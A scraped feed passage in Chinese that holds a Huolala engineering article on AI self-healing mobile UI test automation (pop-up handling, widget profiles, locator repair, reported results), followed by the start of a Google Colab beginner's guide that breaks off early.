<li><strong>新功能，仍是“人工驱动”</strong> ：多机同步本质上是将 N 次在手机上的操作变成 1 次，测试执行本身依然需要依赖人工。</li>
</ul>
<p>因此，我们需要从上述两个方向上寻求突破，打通“最后一公里”的障碍，真正实现测试提效的闭环。针对新功能测试仍依赖“人工驱动”的瓶颈，我们团队已在积极探索相关解决方案，并计划在后续进行分享；本文则将聚焦于 UI 自动化测试实践中的稳定性和效能瓶颈，深入探讨其挑战与实践路径。</p>
<h2 data-id="heading-1">二、UI自动化的局限性</h2>
<p>我们通过分析UI自动化测试的历史报告与脚本维护人员的实际痛点，发现两大核心困境正吞噬着测试效能：</p>
<ul>
<li><strong>脚本维护的“循环”困境</strong> 传统 UI 脚本高度依赖元素定位策略（如 ID 、图像或文本匹配），在货拉拉单周迭代App 的冲击下带来的UI微调，每周都有不少的脚本陷入“抢救式”修复。</li>
<li><strong>执行稳定性的瓶颈</strong> 面对品牌碎片化带来的各类弹窗“突袭”（如系统推送、权限申请、App广告等），自动化脚本的平均通过率长期徘徊在80%的瓶颈线上；为保障稳定性，需要持续在脚本中叠加各类弹窗识别与处理逻辑，进一步拉高维护成本。</li>
</ul>
<p>这两大困境如同一个永远填不满的沙漏，不断的在蚕食宝贵的测试资源。</p>
<h2 data-id="heading-2">三、AI介入UI自动化</h2>
<p>传统UI自动化测试元素定位策略暴露出严重的脆弱性和维护成本，我们通过在测试执行过程中引入<strong>AI</strong> <strong>自愈能力（多模态特征融合+视觉模型+语义分析能力），</strong> 为UI脚本提升鲁棒性。AI介入时机如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5080afb65b349609d4a6c1816068f3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=3lTjv6W9xpvbEHdU%2BYr6nshd20I%3D" alt="image.png" loading="lazy"/></p>
<p>AI驱动的UI自动化，突破传统“脚本失效即中断”的脆弱模式，构建感知-诊断-决策-修复的智能闭环体系，其核心优势在于：</p>
<ul>
<li><strong>精准问题定位：</strong> 当用例执行中断时，AI自愈通过多模态数据（截图、OCR、DOM、Exception）进行智能诊断，结合知识库、控件画像精准识别问题类型（弹窗中断、元素变更等）。</li>
<li><strong>闭环自愈能力：</strong> 诊断结果直接生成结构化<code>Action</code>指令（如“弹窗关闭”或“定位器修复”），通过映射脚本重试，任务成功后自动更新用例库，实现“发现问题→分析问题→解决问题”的完整闭环，无需人工介入。</li>
</ul>
<h2 data-id="heading-3">四、AI自愈能力构建</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/110c08bf8b684988a52a564bf425b3f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=HIRniX49CBgI2PWbfw3IvJHEnDM%3D" alt="image.png" loading="lazy"/>
AI驱动的UI自动化新范式系统架构采用多层能力设计，各层职责明确、协同运作：</p>
<ul>
<li>
<p><strong>能力建设层面</strong> 提供四大核心能力，弹窗智能处理、文本自愈、元素自愈、智能等待，直接面向测试场景中的困难解决具体问题。</p>
</li>
<li>
<p><strong>数据采集层面</strong></p>
<ul>
<li>多模态数据基线：整合APP信息、用例步骤、设备快照、OCR与DOM数据；</li>
<li>用例库管理：通过脚本映射、自愈标记实现用例智能更新，确保修复成果持续沉淀。</li>
</ul>
</li>
<li>
<p><strong>UI自愈Agent层面</strong></p>
<ul>
<li>知识库：沉淀业务知识、历史经验、弹窗特征与规则模板；</li>
<li>智能引擎：驱动弹窗分析、文本/元素变更感知等核心能力；</li>
<li>智能决策体：实现问题诊断与行动决策的闭环，是“自愈大脑”。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">4.1 五步诊断法</h3>
<p>当测试任务异常中断时，AI自愈会执行五步分层诊断流程：首先检测设备健康状态（内存/磁盘/网络/物理连接），其次验证自动化框架可用性（会话状态与驱动服务），第三步通过AI大模型融合弹窗知识库识别干扰弹窗类型智能处理，第四步利用视觉语言模型（VLM）分析页面加载状态与内容完整性，最后基于控件画像与历史基线进行多模态大模型比对，精准感知元素变更。AI自愈采用递进式决策机制，每步输出结构化修复指令（如“弹窗中断→安全关闭”、“元素变更→动态重构定位器”）。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2729240d4493417990f2ac3df35c84c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=oKYmPc3iVvhcOqVvPnqLPaCJXxM%3D" alt="image.png" loading="lazy"/></p>
<p>五步诊断流程由自愈引擎服务来驱动，各层级诊断结果会输出结构化的可执行修复指令。自愈引擎服务时序图如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71c2cfc3a061430b89abb0a761429b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=FI7U2bBtFJzyqURED7Ko5CEmFbE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">4.2 弹窗智能处理引擎</h3>
<h4 data-id="heading-6">4.2.1 跨平台弹窗碎片化挑战</h4>
<p>跨平台弹窗碎片化挑战：在Android/iOS/HarmonyOS多平台、OPPO/vivo/小米等品牌及MIUI/ColorOS等定制系统环境下，同类弹窗（如位置权限申请）呈现高度差异化的UI表现。如图所示，仅位置权限弹窗在不同设备上的按钮布局、文案表述及交互模式均存在显著差异。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ebb93567d9f4aa6beea60276742658e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=pK%2F0z2yUJSJeOCbapTH9h8u6UCM%3D" alt="" loading="lazy"/></p>
<p>Android方面，传统方案（如基于<code>DeviceOwner</code>权限自动授权）仅能覆盖部分场景，对厂商深度定制的Rom（隐私合规、系统通知类，OPPO系弹窗）仍存在适配盲区，iOS和Harmony方面则缺少自动授权模式。所以还有部分方案还是通过规则来匹配，但是无论我们加多少层匹配，下次执行的时候还是会出现新的问题。</p>
<h4 data-id="heading-7">4.2.2 结构化弹窗特征建模</h4>
<p>我们的解法不再穷举模式，而是构建特征弹窗认知体系：VL大模型从视觉布局、语义关键词维度抽象弹窗本质特征，对弹窗进行多维度、语义化的归类建模（如按权限、系统通知等类型），将其泛化为可理解的结构化知识，最后输入给大模型分析并推理弹窗和决策处理。</p>
<p>这里列举一下常见的弹窗类型：</p>
<ol>
<li>权限申请类：位置、存储、通知、电话、短信等；</li>
<li>系统通知类：系统更新、电量警告、系统推送、存储不足等；</li>
<li>隐私合规类：数据收集、隐私合规等；</li>
<li>厂商定制类：优化建议、自启动、省电模式激活等等。</li>
</ol>
<p>暂时无法在飞书文档外展示此内容</p>
<p>与先前探索的传统方式比较，从“机械匹配”升级为“智能认知”处理，优势如下：</p>









































<table><thead><tr><th>维度</th><th>枚举法</th><th>AI智能处理</th><th>AI优势</th></tr></thead><tbody><tr><td>处理逻辑</td><td>基于固定规则匹配</td><td>基于语义理解与特征泛化</td><td>能处理未见过的弹窗变体</td></tr><tr><td>决策精度</td><td>易受UI变动影响</td><td>差异化处理：同意、确认、好的...</td><td>具备鲁棒性，可以动态自适应</td></tr><tr><td>复用价值</td><td>脚本内嵌，难共享</td><td>平台通用能力</td><td>独立的数据资产</td></tr><tr><td>维护成本</td><td>需人工添加规则，线性增加</td><td>特征库轻量较准，微调即可</td><td>维护成本低</td></tr><tr><td>演进能力</td><td>静态固化</td><td>动态学习</td><td>具备知识学习能力</td></tr></tbody></table>
<h3 data-id="heading-8">4.3 页面变化智能感知引擎</h3>
<p>结合我们的历史数据整理分析，常见的UI变更包括：</p>
<ul>
<li>
<p><strong>文案调整类</strong></p>
<ul>
<li>产品为优化用户提示体验，例如，将文案从 “确定加价5元吗?” 调整为 “您确定加价 5元吗?”。从文本变更角度看，包含两处细微但典型的调整：</li>
<li>句首新增敬语“您”，提升语气友好度；</li>
<li>“5元”前插入空格；</li>
</ul>
</li>
<li>
<p><strong>ID重构类</strong></p>
<ul>
<li>ID的重新命名和出于安全、混淆或工程规范考虑，控件 ID 的动态化也日益普遍。开发团队常将静态 ID（如 <code>btn_confirm</code>）替换为运行时生成的动态 ID（如 <code>btn_confirm_a6p6a8</code> 或完全移除 ID），导致传统基于 <code>resource-id</code> 或 <code>accessibility-id</code> 的定位策略彻底失效。</li>
</ul>
</li>
<li>
<p><strong>布局重构类</strong></p>
<ul>
<li>为提升 UI 渲染性能，开发团队常对控件布局与层级结构进行优化（如减少嵌套层级、替换容器类型等等）。然而，这类结构性调整往往导致高度依赖 DOM 路径的 XPath 定位器集体失效。</li>
</ul>
</li>
</ul>
<p>我们可以归纳页面的变化包括文本（Text）和元素（Element）调整，针对于这些UI的调整，传统的UI自动化并不能自适应，此时，需引入页面变化感知能力：基于多模态基线（截图、OCR、DOM）与控件画像（类型、层级、上下文），对 UI 变更进行结构化比对，准确识别变更性质，从而在Text、ID、 XPath 等定位器失效时，精准触发自愈修复，避免无效重试。对比方案图参考：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d67c4ed0a5462ea536a6e881c82112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=JP3DAFqTQ6G1AW%2Bpg6Evz9bKSTM%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">4.3.1 赋予控件“数字身份证”</h4>
<p>在实践过程中，我们发现，由环境噪音等非UI变更因素导致的临时性失败，测试中断后 AI 自愈泛化后会误判，做了一些无效重试，既增加了测试时长影响效率，也拉低了整体自愈成功率。为解决这一问题，我们引入控件画像机制。控件画像是对 UI 界面中任一交互元素（如文本、按钮、输入框等）进行的多维度、结构化特征刻画，包含其内在属性（类型）、结构关系（层级）与环境上下文（周围），形成该控件的“数字身份”，在基线采集阶段，我们为用例的关键操作步骤生成对应的控件画像，作为后续变更感知与智能修复的核心依据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe234dc79bef415ab66550f249aa7858~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=bZub3Dlc9Nm4TZ5fi9n%2BqGTZfrk%3D" alt="image.png" loading="lazy"/></p>
<p><strong>控件类型</strong>：描述控件的功能类别和视觉表现，可以从控件的类名（id、Class）、功能类型（语义角色）、文本内容、视觉特征、交互的属性等维度描述，目的是为了识别“这是一个<strong>橙色的确认按钮</strong>”，而非简单的“一个id为btn_confirm”的元素。</p>
<p><strong>关系上下文：</strong> 描述控件所处的页面语义与交互上下文，可以页面全文理解、业务上下文等方面描述，理解“这是<strong>隐私政策协议底部的同意按钮</strong>”，而非任意“同意”文本。</p>
<p><strong>结构关系</strong>：描述控件在 UI 树中的结构位置与父子关系，可以从DOM路径、深度层级、父容器、兄弟节点、子节点等维度描述，目的是为了抗布局微调。</p>
<p>控件画像相较于传统定位器仅依赖单一属性，控件画像通过多维度特征融合（类型、层级、上下文），显著提升了控件识别的鲁棒性与可解释性。更为重要的是，在基于大模型的基线比对流程中，控件画像作为结构化先验知识，可以有效约束大模型输出，减少其因过度泛化而产生误判，是实现“智能但不失控”的关键机制。
如图所示，大模型在引入控件画像后的诊断结果的差异：</p>
<ul>
<li><strong>未引入控件画像</strong> <strong>：</strong> 大模型将“专票(撮合)”泛化成类似语义的“开票”；</li>
<li><strong>引入控件画像</strong> <strong>：</strong> 大模型将“专票(撮合)”判定为移除。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd47cc0050d64073a65c96ae59de661f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=KtZKMbwdjj%2BROV%2BYT7fYDXEGGXQ%3D" alt="screenshot-20260203-194234.png" loading="lazy"/></p>
<h4 data-id="heading-10">4.3.2 文本、元素变化自愈</h4>
<p>对于页面变化感知和自愈引擎的实现，可以简单分为三阶段流程实现对页面变化的精准感知与智能修复能力，如图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6890f21435814e35abe301f83ed7b994~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=dBgwMR2WYCUgdK67NUzhxrPRBEk%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>基线构建阶段</li>
</ul>
<p>在用例成功执行时，我们会同步采集三类数据： 通过 adb (Android)、tidevice (iOS)、hdc (HarmonyOS) 获取设备截图快照，PaddleOCR 提取页面文本内容， Appium、hdc 获取当前控件树结构。将这些多模态数据融合后，同时生成目标控件的结构化描述（即控件画像）。为降低大模型推理耗时与 tokens消耗，我们在采集过程中会对截图进行压缩和非关键区域（状态栏、导航栏）剪切，并对控件树进行冗余节点清洗。</p>
<ul>
<li>
<p><strong>变化感知阶段</strong></p>
<ul>
<li>
<p>测试中断时，相关自愈引擎启动：</p>
<ul>
<li>文案引擎：结合控件画像和基线，通过VL大模型进行语义、功能、结构分析出期望文本。</li>
<li>元素引擎：结合控件画像和基线，通过大模型对当前DOM 认知，分析出期望元素。</li>
</ul>
</li>
<li>
<p>多维度匹配，从三个层面验证控件一致性：</p>
<ul>
<li>语义层面：语义相似度分析核心意图，判断“您确定加价 5元吗?”与“确定加价5元吗?”是否功能等价；</li>
<li>位置层面：验证控件拓扑关系，通过视觉边界和相邻节点匹配，确认控件位置变化是否和功能匹配；</li>
<li>结构层面：分析 DOM 树变化比对关键路径，识别层级重构的场景；</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>智能修复阶段</strong></p>
</li>
</ul>
<p>结合多维度匹配和推理置信度，对有效变更自动生成两种修复策略：选择器优化（调整现有定位条件）与选择器重构（生成全新定位）。</p>
<ul>
<li>变更类型输出：文案优化、元素重构、布局调整；</li>
<li>定位器输出：选择器重构、健壮性优先的定位器；</li>
<li>步骤级别重试：精准定向修复，保留业务数据状态，避免重复之前的步骤。</li>
</ul>
<p>页面变化智能感知相较于传统UI自动化执行模式对比：</p>



































<table><thead><tr><th><strong>维度</strong></th><th><strong>传统UI自动化</strong></th><th><strong>页面变化智能感知</strong></th><th><strong>AI关键能力差异</strong></th></tr></thead><tbody><tr><td>问题应对机制</td><td>脚本失效即失败，依赖人工修复</td><td>自动介入</td><td>AI自动生成新定位器并动态替换执行</td></tr><tr><td>维护成本</td><td>每次UI变更需人工更新定位器</td><td>无需人工介入</td><td>降低维护成本</td></tr><tr><td>自适应能力</td><td>仅支持预定义场景，无法处理未知变更</td><td>AI自动捕获元素、文本、布局变化</td><td>多模态比对 + LLM语义分析，精准定位</td></tr><tr><td>资源效率</td><td>全量步骤重跑，设备资源浪费严重</td><td>精准步骤级重试，保留业务上下文</td><td>只消耗大模型推理时间</td></tr></tbody></table>
<h2 data-id="heading-11">五、实践效果与收益</h2>
<p>我们构建的AI自愈体系，核心价值在于突破传统UI自动化的维护瓶颈，将脚本维护模式从“人工被动响应”升级为“系统主动免疫”。自愈体系上线3个月以来，已在货拉拉移动端核心业务线验证显著成效：</p>















<table><thead><tr><th align="left">弹窗智能处理</th><th align="left">元素智能修复</th><th align="left">文案智能修复</th></tr></thead><tbody><tr><td align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02fce6e1e55340b6ac75b1ac44329ebb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=SMa%2BcYjjjQC9ZvhBi7SniHctiMg%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82311c32a4b54cec9cc127a1f2d8cfed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=gV2%2FVhCVRfa5P0iDPY7he3b0bd0%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f351e00f5e7d414a8aa509d809f46d67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=0Xn2BWZTbtKZm1Vf775PTE4X2V4%3D" alt="转存失败，建议直接上传图片文件" loading="lazy"/></td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d25e81db85410c8771dd5b6dc0f0cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775110&amp;x-signature=qnWX6R3sl%2BGKrRc4dXzUDqyd3PA%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>稳定性跃升</strong>：脚本平均通过率从<strong>80%</strong> 提升至<strong>90%+</strong> ；</li>
<li><strong>规模化验证</strong>：在<strong>325</strong>个高频执行脚本中成功实施自愈，覆盖了司机端和用户端核心路径；</li>
<li><strong>维护效率提升</strong>：节省脚本维护同学人力<strong>40%</strong> ，可以转向高价值测试场景探索；</li>
</ul>
<h2 data-id="heading-12">六、未来展望</h2>
<blockquote>
<p>“道阻且长，行则将至，行而不辍，未来可期”。——《荀子·修身》</p>
</blockquote>
<p>面对移动端测试效能的“最后一公里”挑战，我们基于视觉大模型（VLM）技术构建自适应的新范式正逐步破解传统UI自动化测试局限的难题。这里，我们再次引用《荀子·修身》：“道阻且长，行则将至，行而不辍，未来可期”。在AI技术飞速发展的今天，我们秉持“AI增强而非替代人类”的理念，通过持续的技术创新与工程实践来提升测试效率与软件质量。接下来，AI自愈能力将持续演进：</p>
<ul>
<li><strong>从自愈到自建：智能生成自动化测试用例</strong></li>
</ul>
<p>当前AI自愈系在应对局部UI调整时效果显著，但对需求变更引发的交互流程重构存在能力边界。未来我们将构建用例智能生成到自愈优化的全链路闭环。</p>
<ul>
<li><strong>赋能其它智能体</strong></li>
</ul>
<p>提供MCP或者OpenAPI能力，手工测试用例AI执行Agent、智能下单遍历服务的接入。</p>
<ul>
<li><strong>减少成本</strong></li>
</ul>
<p>针对AI自愈多模态输入的高tokens消耗问题，出于成本考量，我们将通过多模态数据精简与流程优化等方面节省tokens。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[大模型实战 03预备] 云端炼丹房 1：Google Colab 上手指南]]></title>    <link>https://juejin.cn/post/7602246300453994531</link>    <guid>https://juejin.cn/post/7602246300453994531</guid>    <pubDate>2026-02-03T12:08:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602246300453994531" data-draft-id="7602205524719337506" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[大模型实战 03预备] 云端炼丹房 1：Google Colab 上手指南"/> <meta itemprop="keywords" content="人工智能,Google"/> <meta itemprop="datePublished" content="2026-02-03T12:08:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿尔的代码屋"/> <meta itemprop="url" content="https://juejin.cn/user/2637068702854868"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [大模型实战 03预备] 云端炼丹房 1：Google Colab 上手指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637068702854868/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿尔的代码屋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:08:32.000Z" title="Tue Feb 03 2026 12:08:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">[大模型实战 03预备] 云端炼丹房 1：Google Colab 上手指南</h2>
<blockquote>
<p><strong>核心摘要 (TL;DR)</strong></p>
<ul>
<li><strong>痛点</strong>：本地电脑显存不足，跑不动 7B 以上的大模型，或者运行速度如蜗牛。</li>
<li><strong>方案</strong>：利用 <strong>Google Colab</strong> 提供的免费 Tesla T4 GPU 算力。</li>
<li><strong>技巧</strong>：通过挂载 <strong>Google Drive</strong>，解决 Colab 运行时重置导致模型文件丢失的问题。</li>
<li><strong>目标</strong>：配置好云端环境，为下一篇“云端运行 RAG”打好地基。</li>
</ul>
</blockquote>
<h3 data-id="heading-1">前言</h3>
<p>Ollama因为有llama.cpp库和量化技术的加成，是可以在cpu和更日常的电脑上运行的，但是性能是远比不上在专业的显存设备上的。
有高端显卡（NVIDIA 4090/5090/A100/H100），可以在自己的服务器上脱缰运行小规模的大模型。但是对于没有高端显卡设备的友人们也不用担心, 我们可以使用谷歌大善人带给我们的免费GPU算力：爱来自Google Colab。 本篇博文的主要目的就是提前带各位友人们从零上手Colab的核心操作，确保在我们后续的实战过程中的流畅操作。</p>
<h3 data-id="heading-2">1. Google Colab</h3>
<p>一言概之，<a href="https://link.juejin.cn?target=https%3A%2F%2Fcolab.research.google.com%2F" target="_blank" title="https://colab.research.google.com/" ref="nofollow noopener noreferrer">Google Colab</a> = <strong>Jupyter Notebook</strong> + <strong>云端服务器</strong></p>
<ul>
<li><strong>Jupyter Notebook</strong>：我们知道python是一门动态脚本语言，意味着我们可以一边编写，一边以交互式的方式看到当前结果，然后还能继续往下写。Jupyter Notebook就是一种可以一边写代码，一边写文档，还能实时看到代码运行结果的交互式笔记。</li>
<li><strong>云端服务器</strong>：区别于在我们本地环境写代码时，代码在我们的本地电脑，换一台电脑就需要重新拉取代码运行，在云端服务器编码是在远程的服务器编码，我们通过自己的电脑，甚至手机或者任何能联网打开浏览器的设备，连接上远程的那台服务器进行代码编写和模型训练。会更为灵活，不受设备限制。</li>
</ul>
<h3 data-id="heading-3">2. 快速介绍</h3>
<h4 data-id="heading-4">2.1 访问与创建</h4>
<ol>
<li>咱们确保有一个Google账户，并且登录</li>
